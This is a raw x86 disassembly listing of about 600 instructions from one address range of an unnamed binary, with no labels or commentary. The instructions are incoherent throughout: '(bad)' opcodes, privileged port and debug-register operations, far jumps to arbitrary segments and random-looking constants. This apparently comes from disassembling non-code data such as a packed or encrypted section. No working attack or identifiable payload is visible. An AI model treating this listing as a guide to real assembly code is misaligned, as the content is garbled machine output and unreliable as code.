  413e18:	adc    ebx,DWORD PTR [eax+0x2974dcf2]
  413e1e:	cld    
  413e1f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  413e21:	cdq    
  413e22:	add    DWORD PTR [eax-0x241286e],edx
  413e28:	int3   
  413e29:	inc    esp
  413e2a:	push   edx
  413e2b:	imul   ecx,DWORD PTR [ecx-0x75a5842d],0xcf5cd285
  413e35:	xchg   edx,eax
  413e36:	ja     0x413eaf
  413e38:	inc    DWORD PTR [edi-0x28]
  413e3b:	data16 test al,0xc1
  413e3e:	or     al,0xb7
  413e40:	or     DWORD PTR [edi],edx
  413e42:	mov    fs,WORD PTR ds:0x13dcae0e
  413e48:	or     al,0x49
  413e4a:	pop    ebx
  413e4b:	mov    eax,ds:0xf6cd779
  413e50:	jle    0x413e99
  413e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e53:	lock xor BYTE PTR [ebp+0x1c],0x90
  413e58:	mov    ds:0x86ada6bc,eax
  413e5d:	mov    eax,ds:0x3c051dac
  413e62:	dec    edx
  413e63:	cmp    ebx,edi
  413e65:	imul   ebp,esp,0x63f5a29c
  413e6b:	mov    esi,0xed20ddb0
  413e70:	jp     0x413e1f
  413e72:	daa    
  413e73:	fs push ebx
  413e75:	int3   
  413e76:	cmp    al,0xa1
  413e78:	sbb    esi,esp
  413e7a:	mov    esp,0x5d99dc45
  413e7f:	sahf   
  413e80:	dec    ebx
  413e81:	neg    DWORD PTR [eax]
  413e83:	in     al,dx
  413e84:	icebp  
  413e85:	inc    ebx
  413e86:	aam    0xad
  413e88:	ins    DWORD PTR es:[edi],dx
  413e89:	mov    BYTE PTR [ebx+0x8],ch
  413e8c:	fldcw  WORD PTR [eax+0x74238198]
  413e92:	loop   0x413e56
  413e94:	je     0x413e65
  413e96:	inc    ebx
  413e97:	jb     0x413eef
  413e99:	std    
  413e9a:	dec    edi
  413e9b:	mov    al,ds:0x8e6ff6da
  413ea0:	inc    ebp
  413ea1:	std    
  413ea2:	or     al,0xf9
  413ea4:	enter  0xe806,0xe2
  413ea8:	xor    cl,BYTE PTR [eax-0x2b]
  413eab:	mov    al,0x99
  413ead:	sbb    BYTE PTR [edx+0x45e2a2da],bl
  413eb3:	imul   ebp,DWORD PTR [ecx-0xfaace21],0x7
  413eba:	lods   al,BYTE PTR ds:[esi]
  413ebb:	push   ebp
  413ebc:	lods   al,BYTE PTR ds:[esi]
  413ebd:	jg     0x413e73
  413ebf:	fcomp  QWORD PTR [ebp+0x57015356]
  413ec5:	lods   al,BYTE PTR ds:[esi]
  413ec6:	in     eax,0xb4
  413ec8:	ret    
  413ec9:	xlat   BYTE PTR ds:[ebx]
  413eca:	pop    ecx
  413ecb:	out    dx,eax
  413ecc:	imul   edx,DWORD PTR [eax+0x1bf2b472],0xffffff8d
  413ed3:	cmp    al,BYTE PTR [ebx]
  413ed5:	inc    esp
  413ed6:	pop    ss
  413ed7:	fadd   DWORD PTR [esi+0x2f]
  413eda:	ins    DWORD PTR es:[edi],dx
  413edb:	mov    cl,0xfe
  413edd:	pop    ebp
  413ede:	mov    edx,0x77071de0
  413ee3:	ror    DWORD PTR [eax],1
  413ee5:	inc    edx
  413ee6:	sbb    BYTE PTR [esi+0x77],al
  413ee9:	mov    dl,ch
  413eeb:	js     0x413e8e
  413eed:	push   eax
  413eee:	in     al,0x3d
  413ef0:	mov    ah,0xda
  413ef2:	scas   eax,DWORD PTR es:[edi]
  413ef3:	hlt    
  413ef4:	jae    0x413f68
  413ef6:	push   ss
  413ef7:	sbb    DWORD PTR [edx],esi
  413ef9:	mov    ah,0xe8
  413efb:	popa   
  413efc:	in     al,dx
  413efd:	shl    esp,0x2d
  413f00:	xchg   eax,esi
  413f02:	cli    
  413f03:	mov    ds:0xb0328762,eax
  413f08:	retf   0x25f
  413f0b:	out    0xc9,al
  413f0d:	jmp    0xe6b1da3b
  413f12:	lods   al,BYTE PTR ds:[esi]
  413f13:	mov    ecx,0xde4a9c13
  413f18:	inc    edx
  413f19:	test   al,0xa7
  413f1b:	jmp    0xf7e79ac1
  413f20:	in     al,0x9d
  413f22:	dec    edi
  413f23:	outs   dx,BYTE PTR ds:[esi]
  413f24:	(bad)  
  413f25:	jmp    0xfc1a7ab1
  413f2a:	das    
  413f2b:	pop    ecx
  413f2c:	push   esi
  413f2d:	or     edi,esi
  413f2f:	mov    ah,ch
  413f31:	pop    eax
  413f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f33:	rcl    BYTE PTR [edi+ebp*8-0x56e53cbb],0x71
  413f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f3c:	in     eax,0x47
  413f3e:	mov    eax,ds:0x7e63ef99
  413f43:	mov    BYTE PTR [ebx-0x38bdaaa2],cl
  413f49:	xchg   edi,eax
  413f4a:	call   0xc033:0x1854d406
  413f51:	stos   DWORD PTR es:[edi],eax
  413f52:	dec    ecx
  413f53:	loopne 0x413f27
  413f55:	(bad)
  413f58:	dec    edi
  413f59:	(bad)  
  413f5a:	shl    ah,cl
  413f5c:	jno    0x413f45
  413f5e:	(bad)  
  413f5f:	call   0x6978:0xbe24eebc
  413f66:	dec    edx
  413f67:	mov    ebx,0x355701a0
  413f6c:	jno    0x413fea
  413f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f6f:	out    dx,al
  413f70:	push   edi
  413f71:	icebp  
  413f72:	lds    esi,FWORD PTR [ecx]
  413f74:	movntps XMMWORD PTR [ecx+0x50e1c5bf],xmm2
  413f7b:	outs   dx,DWORD PTR ds:[esi]
  413f7c:	sub    BYTE PTR [edx-0x1e],bh
  413f7f:	xor    DWORD PTR [eax+0x77],ebp
  413f82:	pop    ebx
  413f83:	icebp  
  413f84:	(bad)  
  413f85:	cmp    eax,0xc679a140
  413f8a:	and    al,0xbf
  413f8c:	cld    
  413f8d:	add    ecx,DWORD PTR [ebp+0x605b3131]
  413f93:	mov    esp,0x40e680d3
  413f98:	mov    bl,0xe4
  413f9a:	pop    ds
  413f9b:	push   ecx
  413f9c:	push   cs
  413f9d:	stos   DWORD PTR es:[edi],eax
  413f9e:	cmp    eax,0x8b74aa48
  413fa3:	lods   al,BYTE PTR ds:[esi]
  413fa4:	sub    eax,0xb003f4d5
  413fa9:	mov    ecx,ebp
  413fab:	ja     0x413fc5
  413fad:	mov    ebx,0x3bc19d81
  413fb2:	mov    esi,0x1ee197ad
  413fb7:	inc    eax
  413fb8:	pop    es
  413fb9:	nop
  413fba:	retf   0xce50
  413fbd:	inc    ecx
  413fbe:	and    DWORD PTR [esi],ebp
  413fc0:	test   eax,0x1502090a
  413fc5:	sbb    ebx,DWORD PTR [edx]
  413fc7:	inc    edi
  413fc8:	fisttp QWORD PTR ds:0x3431083d
  413fce:	les    esp,FWORD PTR [esi-0x70ec1e63]
  413fd4:	fstp   DWORD PTR [esi]
  413fd6:	(bad)  
  413fd7:	lods   eax,DWORD PTR ds:[esi]
  413fd8:	int    0xba
  413fda:	mov    DWORD PTR [ebx],0xa4194382
  413fe0:	out    0x7f,eax
  413fe2:	outs   dx,BYTE PTR ds:[esi]
  413fe3:	stos   DWORD PTR es:[edi],eax
  413fe4:	or     ch,bh
  413fe6:	lods   al,BYTE PTR ds:[esi]
  413fe7:	xchg   ecx,eax
  413fe8:	sbb    eax,0xa8433520
  413fed:	dec    edi
  413fee:	popa   
  413fef:	mov    ah,0xea
  413ff1:	push   eax
  413ff2:	fstp   QWORD PTR [ecx+0x13158704]
  413ff8:	add    dl,dl
  413ffa:	xchg   ecx,eax
  413ffb:	mov    ebx,0xe1661f4c
  414000:	mov    ecx,ebx
  414002:	add    bl,BYTE PTR [esi-0x5e]
  414005:	loop   0x41401a
  414007:	jne    0x413fb3
  414009:	jno    0x413f98
  41400b:	push   ss
  41400c:	jo     0x41406d
  41400e:	in     eax,0x11
  414010:	mov    esi,0x124b9b57
  414015:	xor    DWORD PTR [esi],ebx
  414017:	sbb    ebx,DWORD PTR [edi+ebp*2-0x62]
  41401b:	bound  eax,QWORD PTR [ecx]
  41401d:	into   
  41401e:	xchg   esi,eax
  41401f:	sahf   
  414020:	adc    esp,DWORD PTR [edi-0x28]
  414023:	dec    eax
  414024:	lock je 0x41405a
  414027:	shr    DWORD PTR [ecx+edx*8+0x57],cl
  41402b:	(bad)  
  41402c:	xlat   BYTE PTR ds:[ebx]
  41402d:	xchg   ecx,edx
  41402f:	mov    esi,0x8a3c5f5c
  414034:	mov    edi,0xd1c14a1a
  414039:	sbb    dl,BYTE PTR [esi+edi*2-0x9ce8e2]
  414040:	mov    cl,0x19
  414042:	cmp    al,0x1
  414044:	stos   BYTE PTR es:[edi],al
  414045:	in     eax,dx
  414046:	dec    esp
  414047:	js     0x413fcb
  414049:	scas   al,BYTE PTR es:[edi]
  41404a:	jmp    0x414079
  41404c:	(bad)  
  41404d:	cmp    eax,0x2f3607a1
  414052:	or     bl,BYTE PTR [ebp-0x44e1b452]
  414058:	sbb    eax,0x6aec0ddc
  41405d:	pop    edx
  41405e:	imul   ebx,DWORD PTR [eax+0x5b],0x56c0cfed
  414065:	rol    cl,cl
  414067:	arpl   WORD PTR [edx],di
  414069:	cmp    DWORD PTR [ecx],edi
  41406b:	addr16 mov al,es:0x7dff
  414070:	adc    ebp,DWORD PTR [edx+0x4a1e622e]
  414076:	sbb    eax,0x77d49bc3
  41407b:	xchg   edx,eax
  41407c:	pop    esp
  41407d:	push   edi
  41407e:	ror    edi,cl
  414080:	sahf   
  414081:	mov    db0,esi
  414084:	popa   
  414085:	fadd   DWORD PTR [edx]
  414087:	fbstp  TBYTE PTR [eax+ebx*8+0x2]
  41408b:	imul   ebx,DWORD PTR [ebx],0x7e9cd842
  414091:	cdq    
  414092:	add    al,0xb1
  414095:	pop    edx
  414096:	or     edx,DWORD PTR [edi]
  414098:	and    al,0x67
  41409a:	jne    0x4140e4
  41409c:	sbb    edx,DWORD PTR [ecx-0xa]
  41409f:	out    0xe7,al
  4140a1:	pop    ebx
  4140a2:	cs pop eax
  4140a4:	pop    eax
  4140a5:	addr16 out 0x94,al
  4140a8:	in     al,dx
  4140a9:	and    al,0xe3
  4140ab:	push   ds
  4140ac:	jge    0x4140fa
  4140ae:	retf   
  4140af:	mov    dh,0x48
  4140b1:	fs push es
  4140b3:	sbb    eax,0xa9f73879
  4140b8:	push   edi
  4140b9:	push   eax
  4140ba:	add    dh,BYTE PTR [eax+ebx*4+0x4f]
  4140be:	xchg   DWORD PTR [edi],eax
  4140c0:	imul   ebx,DWORD PTR [ebp+0x29],0xb1e98d0f
  4140c7:	and    DWORD PTR [edi-0x2faac03d],0xffffffdd
  4140ce:	fld    QWORD PTR [edx+esi*2+0x2e5d80d6]
  4140d5:	test   eax,0x32d19ebd
  4140da:	test   eax,ebp
  4140dc:	jle    0x4140c0
  4140de:	leave  
  4140df:	lds    esp,FWORD PTR [esi-0x7a]
  4140e2:	cmc    
  4140e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140e4:	mov    ah,0x50
  4140e6:	add    bl,BYTE PTR [ebx+0x1c66e264]
  4140ec:	mov    esp,0xdf204c
  4140f1:	jb     0x41407f
  4140f3:	inc    esp
  4140f4:	jp     0x4140ac
  4140f6:	dec    edi
  4140f7:	call   0xbd0e:0x3b0a17b2
  4140fe:	sub    BYTE PTR [eax+0x6e],ah
  414101:	jmp    0x1be7:0xc9b97db0
  414108:	jno    0x41409c
  41410a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41410b:	jecxz  0x414151
  41410d:	das    
  41410e:	xchg   esi,eax
  41410f:	cmp    ebp,DWORD PTR [edx]
  414111:	and    ebx,esi
  414113:	xor    eax,0xaafc61bc
  414118:	sbb    al,BYTE PTR [edi+0x2f]
  41411b:	std    
  41411c:	push   ebp
  41411d:	and    eax,0x6f84fffd
  414122:	inc    esi
  414123:	jno    0x414125
  414125:	dec    ebx
  414126:	add    al,0x10
  414128:	mov    ds:0x9930f695,al
  41412d:	fld    TBYTE PTR [ebx-0x1ed424fd]
  414133:	(bad)  
  414134:	lahf   
  414135:	push   ebx
  414136:	leave  
  414137:	mov    esi,fs
  414139:	xor    al,0xa
  41413b:	mov    ds:0xacdb5ab3,eax
  414140:	push   ebp
  414141:	inc    DWORD PTR [esi+0x3130e725]
  414147:	mov    ds:0x1760a6d4,eax
  41414c:	je     0x41414b
  41414e:	and    edx,DWORD PTR [ecx+0x5d014140]
  414154:	cmp    ch,BYTE PTR [ebp+0x28da18ec]
  41415a:	and    DWORD PTR [edx+0x54],0xfffffff4
  41415e:	sbb    al,0xaf
  414160:	out    0x88,al
  414162:	mov    esp,0x368e6c6c
  414167:	bound  ebx,QWORD PTR [edi-0x4a]
  41416a:	sbb    esi,ecx
  41416c:	and    ah,BYTE PTR [esi+0x33]
  41416f:	fmul   QWORD PTR [edx]
  414171:	jae    0x4141eb
  414173:	dec    ecx
  414174:	outs   dx,DWORD PTR ds:[esi]
  414175:	xchg   esp,eax
  414176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414177:	outs   dx,DWORD PTR ds:[esi]
  414178:	jmp    0x4141f4
  41417a:	xchg   esi,eax
  41417b:	add    ebp,DWORD PTR [ebx+edi*4-0x4a]
  41417f:	cmp    eax,0x73639bf6
  414184:	add    eax,0x68df594b
  414189:	in     eax,0x4a
  41418b:	test   DWORD PTR [ecx+0x70ec7d1a],esp
  414191:	ficom  WORD PTR ds:0x79133d33
  414197:	xor    DWORD PTR [edi],edi
  414199:	dec    edi
  41419a:	nop
  41419b:	and    ch,ah
  41419d:	push   ds
  41419e:	inc    edx
  41419f:	repz jg 0x414136
  4141a2:	cmp    DWORD PTR [esi+0x1c],ebx
  4141a5:	pop    ebp
  4141a6:	call   0x9f15:0x1818ebe5
  4141ad:	fadd   DWORD PTR [eax-0x67]
  4141b0:	inc    edx
  4141b1:	shl    DWORD PTR [ebx],0x3c
  4141b4:	and    eax,0x1745f07b
  4141b9:	xchg   BYTE PTR ds:0xf8a004c7,bh
  4141bf:	cmp    BYTE PTR ds:0x20924401,dl
  4141c5:	rol    DWORD PTR [edi+ebp*2-0x6779812b],1
  4141cc:	out    dx,al
  4141cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141ce:	into   
  4141cf:	in     eax,dx
  4141d0:	jnp    0x4141c1
  4141d2:	je     0x41419c
  4141d4:	shr    edi,0x50
  4141d7:	shl    bl,1
  4141d9:	cs ret 
  4141db:	aam    0x14
  4141dd:	clc    
  4141de:	mov    esp,0x8c8aefa7
  4141e3:	loop   0x41416c
  4141e5:	xlat   BYTE PTR ds:[ebx]
  4141e6:	rol    DWORD PTR [esi-0x5b],1
  4141e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141ea:	lock rcr DWORD PTR [ebp+0x6],cl
  4141ee:	out    0x4c,al
  4141f0:	xchg   edi,eax
  4141f1:	add    ecx,DWORD PTR [ebp+0x3170eac8]
  4141f7:	add    ebp,edi
  4141f9:	and    dl,dh
  4141fb:	sub    ecx,edi
  4141fd:	mov    bh,0xc3
  4141ff:	adc    edi,DWORD PTR [ebx+0x17]
  414202:	mov    bl,0xed
  414204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414205:	jnp    0x4141ce
  414207:	inc    ecx
  414208:	test   BYTE PTR [eax],cl
  41420a:	push   esi
  41420b:	mov    edx,0xd079c418
  414210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414211:	icebp  
  414212:	mov    edx,0xbb2ea430
  414217:	arpl   WORD PTR [ecx-0x28],sp
  41421a:	std    
  41421b:	mov    cl,BYTE PTR [esi+0x317fb225]
  414221:	push   edx
  414222:	lahf   
  414223:	jp     0x4141b2
  414225:	test   ch,cl
  414227:	dec    eax
  414228:	dec    ebx
  414229:	xlat   BYTE PTR ds:[ebx]
  41422a:	cmp    DWORD PTR [ecx],ecx
  41422c:	xchg   ebp,eax
  41422d:	popa   
  41422e:	clc    
  41422f:	push   cs
  414230:	jns    0x4141c2
  414232:	imul   ecx,DWORD PTR [ebx+0x42844557],0x4f
  414239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41423a:	std    
  41423b:	mov    WORD PTR [edi+0x77],fs
  41423e:	jg     0x4141cd
  414240:	pusha  
  414241:	inc    esp
  414242:	cmp    bh,dh
  414244:	mov    al,0x74
  414246:	pop    ecx
  414247:	sahf   
  414248:	in     al,dx
  414249:	fbld   TBYTE PTR [ebx]
  41424b:	jecxz  0x414241
  41424d:	mov    bh,0xd2
  41424f:	bound  esp,QWORD PTR ss:[edi+0x3851d466]
  414256:	loope  0x4141d9
  414258:	jp     0x4142b3
  41425a:	dec    esp
  41425b:	ror    bh,0xb8
  41425e:	adc    ebx,0x25
  414261:	loop   0x4142dc
  414263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414264:	pop    ebp
  414265:	cmp    al,0xae
  414267:	test   eax,0xdc52340d
  41426c:	nop
  41426d:	hlt    
  41426e:	mov    ecx,0x8b1dee2b
  414273:	fs cwde 
  414275:	pop    edi
  414276:	dec    ebx
  414277:	push   ds
  414278:	gs inc edx
  41427a:	jge    0x4142a4
  41427c:	fadd   QWORD PTR [ebx]
  41427e:	cmp    eax,0x447b9cc6
  414283:	dec    edi
  414284:	jmp    0x3118:0x487e9263
  41428b:	test   BYTE PTR [edi-0x44],dh
  41428e:	loope  0x41425a
  414290:	out    0xd2,al
  414292:	and    ebp,DWORD PTR [esi]
  414294:	cmovge esi,edx
  414297:	xor    BYTE PTR [ecx-0x31eba5ab],dl
  41429d:	sub    esp,DWORD PTR [edx-0x50]
  4142a0:	xchg   edi,eax
  4142a1:	cmp    al,0xcd
  4142a3:	pop    esp
  4142a4:	inc    esp
  4142a5:	adc    al,0xbb
  4142a7:	ret    
  4142a8:	mov    bh,0xab
  4142aa:	jne    0x414236
  4142ac:	shr    esp,1
  4142ae:	pop    es
  4142af:	fs push ecx
  4142b1:	mov    edx,ecx
  4142b3:	jne    0x41424b
  4142b5:	xchg   edi,eax
  4142b6:	dec    esi
  4142b7:	hlt    
  4142b8:	ja     0x414267
  4142ba:	pusha  
  4142bb:	dec    ebx
  4142bc:	dec    ebx
  4142bd:	pop    ss
  4142be:	and    eax,0xc70f25a6
  4142c3:	daa    
  4142c4:	rol    ch,1
  4142c6:	xor    BYTE PTR [ebx+0x1d29529a],bh
  4142cc:	out    0x2e,eax
  4142ce:	pop    eax
  4142cf:	xchg   ebx,eax
  4142d0:	and    al,0xc8
  4142d2:	mov    fs,WORD PTR ds:0xfb24a8c5
  4142d8:	mov    esp,0xbe1743d
  4142dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142de:	inc    ecx
  4142df:	xchg   ebp,eax
  4142e0:	int    0xa5
  4142e2:	retf   0x3aa8
  4142e5:	lods   al,BYTE PTR ds:[esi]
  4142e6:	outs   dx,DWORD PTR ds:[esi]
  4142e7:	pop    edi
  4142e8:	sbb    ah,BYTE PTR [eax]
  4142ea:	mov    al,ds:0xe1f02ebe
  4142ef:	dec    edi
  4142f0:	jae    0x4142ce
  4142f2:	das    
  4142f3:	xchg   esi,eax
  4142f4:	shl    BYTE PTR [edi+0x19601f9a],cl
  4142fa:	call   0xf2f2efdd
  4142ff:	scas   eax,DWORD PTR es:[edi]
  414300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414301:	pop    ebx
  414302:	mov    esi,0x83dbcbf0
  414307:	mov    edi,0x23f5885c
  41430c:	mov    ds,esi
  41430e:	cmp    dh,BYTE PTR [esi+0x33]
  414311:	mov    bl,0x9e
  414313:	addr16 pop esp
  414315:	xor    BYTE PTR [ebp-0x5],ah
  414318:	and    al,0xf1
  41431a:	xor    BYTE PTR [ebx-0x2c],ah
  41431d:	hlt    
  41431e:	ficom  WORD PTR [ecx]
  414320:	mov    BYTE PTR [edi-0x54],0xb0
  414324:	fistp  DWORD PTR [ebp+0x1f]
  414327:	(bad)  
  414328:	jne    0x4142ca
  41432a:	mov    ebx,0x2abe0ec3
  41432f:	out    dx,al
  414330:	xor    esi,eax
  414332:	push   esi
  414333:	in     al,0xfc
  414335:	push   esp
  414336:	nop
  414337:	sbb    BYTE PTR [esi-0x159e8fc0],dl
  41433d:	arpl   WORD PTR ds:0xfa58b4ab,sp
  414343:	test   DWORD PTR [ecx-0x57c49d66],edx
  414349:	inc    ebx
  41434a:	jmp    0xa519a697
  41434f:	in     al,0x7a
  414351:	mov    al,0xbc
  414353:	dec    esp
  414354:	and    al,0x47
  414356:	inc    esp
  414357:	(bad)  
  414358:	les    esi,FWORD PTR [ebx+0x41]
  41435b:	outs   dx,DWORD PTR ds:[esi]
  41435c:	mov    al,ds:0x683e05f4
  414361:	retf   0xa921
  414364:	iret   
  414365:	or     eax,0x291a6a1
  41436a:	fiadd  DWORD PTR [edi+0xd]
  41436d:	fisubr WORD PTR [edi+0x751dc1ea]
  414373:	cli    
  414374:	ficom  WORD PTR [ecx-0x6982ea6c]
  41437a:	in     eax,dx
  41437b:	push   ecx
  41437c:	rcr    ebp,cl
  41437e:	push   ebp
  41437f:	sti    
  414380:	jns    0x4143aa
  414382:	sar    BYTE PTR [ebx*8+0x7eeb4df1],1
  414389:	imul   DWORD PTR [eax-0x65acd0c6]
  41438f:	dec    esi
  414390:	repz rcl DWORD PTR [eax],0xd4
  414394:	enter  0xa16d,0x12
  414398:	xchg   esp,eax
  414399:	stos   BYTE PTR es:[edi],al
  41439a:	imul   ecx,DWORD PTR [ebp+0x77],0xcf4e586b
  4143a1:	fadd   DWORD PTR [eax]
  4143a3:	mov    eax,0xc542c96a
  4143a8:	inc    esp
  4143a9:	sbb    bh,BYTE PTR [esi]
  4143ab:	call   0xef1fa9bd
  4143b0:	out    dx,al
  4143b1:	xor    eax,0xd537b675
  4143b6:	bswap  edx
  4143b8:	xor    eax,0x4657775
  4143bd:	mov    ah,0xd7
  4143bf:	xor    DWORD PTR [ecx+0xdf28ed4],esi
  4143c5:	out    dx,eax
  4143c6:	retfw  
  4143c8:	dec    esi
  4143c9:	(bad)  
  4143ca:	jmp    0x4143a4
  4143cc:	push   esi
  4143cd:	adc    al,BYTE PTR [ecx-0x43]
  4143d0:	or     BYTE PTR [esi],dh
  4143d2:	stc    
  4143d3:	push   DWORD PTR [edx-0x24b42c51]
  4143d9:	mov    cl,0x99
  4143db:	jbe    0x414365
  4143dd:	std    
  4143de:	clc    
  4143df:	fadd   QWORD PTR ds:[ecx]
  4143e2:	(bad)  
  4143e3:	sbb    bh,BYTE PTR [edi]
  4143e5:	out    dx,eax
  4143e6:	fsubr  QWORD PTR [edi+esi*8-0x61aba419]
  4143ed:	ret    0x250d
  4143f0:	push   ecx
  4143f1:	mov    bh,0x56
  4143f3:	mov    bh,0x78
  4143f5:	(bad)  
  4143f6:	xchg   ecx,eax
  4143f7:	lds    esi,FWORD PTR [eax-0x55]
  4143fa:	or     edx,DWORD PTR [esi]
  4143fc:	and    al,0x47
  4143fe:	std    
  4143ff:	adc    eax,0x6afaf679
  414404:	jg     0x4143c3
  414406:	popf   
  414407:	jle    0x4143e8
  414409:	add    edi,DWORD PTR [ebx]
  41440b:	loopne 0x4143b2
  41440d:	sbb    eax,0xd4cbafe0
  414412:	retf   
  414413:	mov    edx,0xef54b202
  414418:	aaa    
  414419:	rol    BYTE PTR [eax-0x22b42a72],1
  41441f:	leave  
  414420:	xor    DWORD PTR [ebx+0x7f],esi
  414423:	ds mov esp,0xaed3da2e
  414429:	adc    ebx,ebx
  41442b:	adc    bl,BYTE PTR [edx-0x147d5b00]
  414431:	scas   al,BYTE PTR es:[edi]
  414432:	sbb    DWORD PTR [esp+edi*8-0x4e9cab71],ecx
  414439:	mov    esi,0x44f285ad
  41443e:	mov    esi,0x47b3275
  414443:	push   0xad195fe0
  414448:	add    al,0xe3
  41444a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41444b:	mov    eax,0xeccb8bc4
  414450:	fist   DWORD PTR [edx-0x5e]
  414453:	fnsave [edx+ebx*2-0x34ee14e2]
  41445a:	fcmovu st,st(0)
  41445c:	mov    bh,0x37
  41445e:	jmp    0x193b35c6
  414463:	popf   
  414464:	jno    0x414425
  414466:	sti    
  414467:	mov    edi,0xaeb17add
  41446c:	sub    edi,ebx
  41446e:	dec    ebx
  41446f:	dec    ebx
  414470:	test   ch,ah
  414472:	daa    
  414473:	xchg   edx,eax
  414474:	xchg   bx,ax
  414476:	data16 cmp bh,bh
  414479:	sub    eax,0xc28a9fb4
  41447e:	pop    ds
  41447f:	push   0x77ef3440
  414484:	(bad)  
  414485:	pop    eax
  414486:	stc    
  414487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414488:	loopne 0x41442f
  41448a:	scas   al,BYTE PTR es:[edi]
  41448b:	inc    edi
  41448c:	add    DWORD PTR [edi+0x36],edi
  41448f:	push   DWORD PTR [eax+ecx*1-0x15d1841a]
  414496:	cs xor al,0xa4
  414499:	sbb    edi,DWORD PTR [ecx+0x2db66f78]
  41449f:	jns    0x4144b5
  4144a1:	mov    dl,BYTE PTR [esi+0x1240e608]
  4144a7:	cwde   
  4144a8:	mov    eax,0x64b71f76
  4144ad:	inc    DWORD PTR [eax]
  4144af:	push   edx
  4144b0:	in     al,0xbc
  4144b2:	rcl    BYTE PTR [esi+0xa65b602],1
  4144b8:	hlt    
  4144b9:	mov    WORD PTR [ecx+0x46],cs
  4144bc:	dec    ebx
  4144bd:	xor    ah,BYTE PTR [esi+0x4e]
  4144c0:	mov    eax,0xce8a449b
  4144c5:	in     al,0x27
  4144c7:	pop    edi
  4144c8:	imul   ebp,ecx,0x2b
  4144cb:	sub    BYTE PTR [eax+0x7054e06c],ah
  4144d1:	pop    ss
  4144d2:	push   eax
  4144d3:	jp     0x414538
  4144d5:	push   esp
  4144d6:	test   ecx,0xb35cfa01
  4144dc:	int3   
  4144dd:	(bad)  
  4144df:	daa    
  4144e0:	add    BYTE PTR [edx-0x3add9436],ah
  4144e6:	test   BYTE PTR [ecx-0x2c59d4a],bh
  4144ec:	mov    dh,0xf0
  4144ee:	dec    esi
  4144ef:	fist   WORD PTR [ebx-0x7e9111df]
  4144f5:	ret    
  4144f6:	cs enter 0x469c,0x7d
  4144fb:	stos   DWORD PTR es:[edi],eax
  4144fc:	xchg   ebx,eax
  4144fd:	int    0x0
  4144ff:	adc    al,0x89
  414501:	push   ss
  414502:	fldcw  WORD PTR [edx]
  414504:	out    dx,al
  414505:	sub    ecx,DWORD PTR ds:0x33cf796
  41450b:	dec    edi
  41450c:	adc    eax,0x88b15e20
  414511:	and    esi,DWORD PTR [esi+0x64]
  414514:	sub    al,0x56
  414516:	push   edx
  414517:	pop    ebx
  414518:	dec    eax
  414519:	push   es
  41451a:	mov    bh,0x37
  41451c:	add    BYTE PTR ss:[ecx-0x2d2d2ba3],bl
  414523:	loop   0x41452e
  414525:	inc    esi
  414526:	cmp    BYTE PTR [edx-0x1152c15],ah
  41452c:	repz xchg ebx,eax
  41452e:	fiadd  DWORD PTR [eax+eiz*1+0x5bd5d8ed]
  414535:	stos   BYTE PTR es:[edi],al
  414536:	sbb    bh,BYTE PTR [ebx-0x2]
  414539:	cmc    
  41453a:	jns    0x414545
  41453c:	jno    0x414593
  41453e:	es mov ecx,0xe70fc330
  414544:	mov    edx,0x4bdcab77
  414549:	mov    ecx,0xf6004bc2
  41454e:	daa    
  41454f:	lds    esi,FWORD PTR [edi+0x4a]
  414552:	addr16 cmp al,0x54
  414555:	sbb    ebp,ebx
  414557:	out    dx,eax
  414558:	pop    eax
  414559:	pop    esp
  41455a:	and    BYTE PTR [ebx],al
  41455c:	dec    ecx
  41455d:	mov    al,0xa3
  41455f:	scas   eax,DWORD PTR es:[edi]
  414560:	jp     0x41454f
  414562:	fld    DWORD PTR [edx-0x7c]
  414565:	jl     0x4145e0
  414567:	lock arpl dx,cx
  41456a:	clc    
  41456b:	stc    
  41456c:	mov    ah,0xfd
  41456e:	stc    
  41456f:	rcl    DWORD PTR [edi],cl
  414571:	leave  
  414572:	repnz test BYTE PTR [edx],bl
  414575:	iret   
  414576:	sub    eax,0xe200c519
  41457b:	imul   edi,DWORD PTR [esi-0x70],0xffffffb3
  41457f:	aaa    
  414580:	sti    
  414581:	lahf   
  414582:	fist   WORD PTR [ebp-0x19]
  414585:	xor    BYTE PTR [esi],bh
  414587:	inc    ecx
  414588:	dec    ebp
  414589:	dec    edi
  41458a:	xchg   ebp,eax
  41458c:	rcr    dl,cl
  41458e:	mov    WORD PTR [edx+0x2f],gs
  414591:	dec    eax
  414592:	pop    es
  414593:	jl     0x414534
  414595:	ins    BYTE PTR es:[edi],dx
  414596:	xor    bh,al
  414598:	loope  0x4145c3
  41459a:	dec    edi
  41459b:	adc    eax,0x71612fbb
  4145a0:	stc    
  4145a1:	bound  edx,QWORD PTR [edx+0x4554aa7d]
  4145a7:	xchg   ebx,eax
  4145a8:	outs   dx,BYTE PTR ds:[esi]
  4145a9:	jns    0x414577
  4145ab:	in     al,0xa4
  4145ad:	clc    
  4145ae:	xchg   DWORD PTR [ebx+0x33],ebx
  4145b1:	mov    BYTE PTR [edx+edi*1+0x39],ch
  4145b5:	test   DWORD PTR [edx+0x561bdb9a],edx
  4145bb:	icebp  
  4145bc:	(bad)  
  4145bd:	neg    DWORD PTR [ebp+0x615fc475]
  4145c3:	popf   
  4145c4:	in     eax,dx
  4145c5:	int    0x32
  4145c7:	cmp    DWORD PTR [eax+0x24],esi
  4145ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145cb:	jno    0x4145f9
  4145cd:	push   edx
